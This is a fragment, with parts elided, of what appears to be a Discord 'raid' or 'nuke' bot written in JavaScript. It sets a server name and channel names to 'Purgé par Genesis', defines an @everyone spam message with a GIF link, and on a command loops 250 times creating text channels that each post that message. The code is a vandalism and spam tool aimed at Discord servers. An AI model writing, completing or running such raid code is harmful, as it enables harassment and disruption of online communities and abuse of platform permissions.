...
const raidmsg = "@everyone Purgé par Genesis \nhttps://cdn.discordapp.com/attachments/513823063058677780/551291308174737419/4adcaaaa5f3aed15a7d654f1cf170c86.gif" 

const guildname = "Purgé par Genesis";
...
const channelname = "Purgé par Genesis";
 	 ...
 	 //} 
				...
				if(msg.content === prefix+"channel"){
			  			...
			  			for(var i = 0; i < 250; i++){
			  				...
			  				msg.guild.createChannel(channelname, "text").then(c => c.send(raidmsg));
